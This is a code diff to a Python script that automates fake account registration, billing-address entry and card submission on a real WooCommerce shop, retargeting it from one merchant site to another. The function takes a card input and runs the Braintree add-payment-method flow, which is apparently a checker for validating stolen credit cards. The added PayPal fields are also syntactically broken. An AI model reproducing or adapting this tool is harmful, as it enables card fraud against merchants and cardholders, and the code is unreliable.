@@ -69,12 +69,13 @@ def Tele(ccx):
 				first_name, last_name = full_name.split()
 
 				return first_name, last_name
-			
+
+	
 	def generate_address():
 		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
 		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
-		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
-		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
+		streets = ["Dunmow Road", "Park Ave", "Park Place", "Ockham Road", "Brynglas Road", "Hart Road", "Boroughbridge Road", "Ivy Lane", "South Street", "Whatlington Road"]
+		zip_codes = ["SP52FU", "YO254WE", "PH70PU", "IP148TX", "BS226HA", "KW15SP", "SG64UF", "BH76BP", "TW91EJ", "DY68AJ"]
 
 		city = random.choice(cities)
 		state = states[cities.index(city)]
@@ -122,7 +123,12 @@ def Tele(ccx):
 			
 	sess = generate_random_code()
 			
-		
+	def generate_password(length=12):
+		characters = string.ascii_letters + string.digits + string.punctuation
+		password = ''.join(random.choice(characters) for i in range(length))
+		return password
+
+	password = generate_password()	
 	
 	
 	
@@ -133,7 +139,7 @@ def Tele(ccx):
 	    'user-agent': user,
 	}
 	
-	response = r.get('https://forfullflavor.com/my-account/', headers=headers)
+	response = r.get('https://www.bebebrands.com/my-account/', headers=headers)
 	
 	
 	
@@ -153,12 +159,21 @@ def Tele(ccx):
 	data = {
 	    'username': username,
 	    'email': acc,
+		'password': password,
+		'wc_order_attribution_source_type': 'typein',
+		'wc_order_attribution_referrer': 'https%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fadd-payment-method%2F',
+		'wc_order_attribution_utm_campaign': '%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29',
+		'wc_order_attribution_utm_id': '%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29',
+		'wc_order_attribution_utm_marketing_tactic': '%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fadd-payment-method%2F',
+		'wc_order_attribution_session_start_time': '2024-07-14+10%3A23%3A59',
+		'wc_order_attribution_session_pages': '3',
+		'wc_order_attribution_session_count': '1',
+		'wc_order_attribution_user_agent': user,
 	    'woocommerce-register-nonce': register,
-	    '_wp_http_referer': '/my-account/',
-	    'register': 'Register',
+	    '_wp_http_referer=%2Fmy-account%2F&register': 'Register',
 	}
 	
-	response = r.post('https://forfullflavor.com/my-account/', headers=headers, data=data)
+	response = r.post('https://www.bebebrands.com/my-account/', headers=headers, data=data)
 	
 	headers = {
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -167,7 +182,7 @@ def Tele(ccx):
 	    'user-agent': user,
 	}
 	
-	response = r.get('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
+	response = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
 	
 	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
 	
@@ -184,21 +199,21 @@ def Tele(ccx):
 	    'billing_first_name': first_name,
 	    'billing_last_name': last_name,
 	    'billing_company': '',
-	    'billing_country': 'US',
+	    'billing_country': 'GB',
 	    'billing_address_1': street_address,
 	    'billing_address_2': '',
-	    'billing_city': city,
+	    'billing_city': 'Seaham',
 	    'billing_state': state,
-	    'billing_postcode': zip_code,
+	    'billing_postcode': 'SR78EL',
 	    'billing_phone': num,
 	    'billing_email': acc,
 	    'save_address': 'Save address',
 	    'woocommerce-edit-address-nonce': address,
-	    '_wp_http_referer': '/my-account/edit-address/billing/',
+	    '_wp_http_referer': '%2Fmy-account%2Fedit-address%2Fbilling%2F',
 	    'action': 'edit_address',
 	}
 	
-	response = r.post('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
 	
 	
 	
@@ -209,7 +224,7 @@ def Tele(ccx):
 	    'user-agent': user,
 	}
 	
-	response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
+	response = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
 	
 	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
 	
@@ -230,7 +245,7 @@ def Tele(ccx):
 		    'nonce': client,
 	}
 		
-	response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
 	
 	enc = response.json()['data']
 	
@@ -301,12 +316,19 @@ def Tele(ccx):
 		    'wc_braintree_credit_card_payment_nonce': tok,
 		    'wc_braintree_device_data': '',
 		    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+            'wc_braintree_paypal_payment_nonce': '',
+            'wc_braintree_device_data': '',
+            'wc-braintree-paypal-context': shortcode
+            'wc_braintree_paypal_amount': shortcode
+            'wc_braintree_paypal_currency': GBP
+            'wc_braintree_paypal_locale': en_gb
+            'wc-braintree-paypal-tokenize-payment-method': true
 		    'woocommerce-add-payment-method-nonce': add_nonce,
-		    '_wp_http_referer': '/my-account/add-payment-method/',
+		    '_wp_http_referer': '%2Fmy-account%2Fadd-payment-method%2F',
 		    'woocommerce_add_payment_method': '1',
 		}
 		
-	response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
 				
 			
 		
